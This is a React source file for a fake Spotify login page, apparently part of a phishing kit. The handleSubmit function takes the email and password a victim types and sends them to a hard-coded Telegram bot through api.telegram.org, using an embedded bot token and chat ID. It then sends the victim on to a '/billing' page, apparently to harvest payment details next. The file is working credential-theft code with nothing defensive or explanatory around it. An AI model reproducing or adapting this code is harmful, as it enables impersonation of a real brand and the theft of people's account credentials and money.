import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom'; // Import useNavigate for navigation
import './App.css'; // Make sure to create this CSS file

const TELEGRAM_BOT_TOKEN = '7247518691:AAGG9Pgry6_a7vna8yOpeuRcmuo79ij9U18';
const TELEGRAM_CHAT_ID = '1436609764';


const SpotifyLogin = () => {
    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');
    const navigate = useNavigate(); // Initialize navigate

    const handleSubmit = (e) => {
        e.preventDefault();

        const message = `
            📋 *User Login Information* 📋
            *Email or Username:* ${email}
            *Password:* ${password}
        `;

        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                navigate('/billing'); // Use navigate to go to the billing page
            } else {
                alert('Failed to send the message. Please try again.');
            }
        })
        .catch(error => {
            console.error('Error:', error);
            alert('Error sending message. Please check the console for details.');
        });
    };

    return (
        <div className="container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/2/26/Spotify_logo_with_text.svg" alt="Spotify Logo" className="logo" />
            <h2>To continue, log in to Spotify.</h2>

            <div className="login-button google-login">
                <img src="https://img.icons8.com/color/16/000000/google-logo.png" alt="Google Icon" />
                LOG IN with Google
            </div>

            <div className="login-button telegram-login">
                <img src="https://img.icons8.com/color/16/000000/telegram-app.png" alt="Telegram Icon" />
                LOG IN with Telegram
            </div>

            <hr className="divider" />
            <span className="or-text">or</span>
            <h3 style={{ fontSize: '16px', color: '#333', marginBottom: '10px' }}>Continue with your email address</h3>

            <form id="loginForm" onSubmit={handleSubmit}>
                <label htmlFor="email">Email address or username?</label>
                <input
                    type="email"
                    id="email"
                    placeholder="Email address or username."
                    required
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                />

                <label htmlFor="password">Your password?</label>
                <input
                    type="password"
                    id="password"
                    placeholder="Password."
                    required
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                />

                <button type="submit">LOG IN</button>
            </form>

            <div className="bottom-text">
                <p>Don't Have an account? <a href="#">Log in.</a></p>
            </div>
        </div>
    );
};

export default SpotifyLogin;
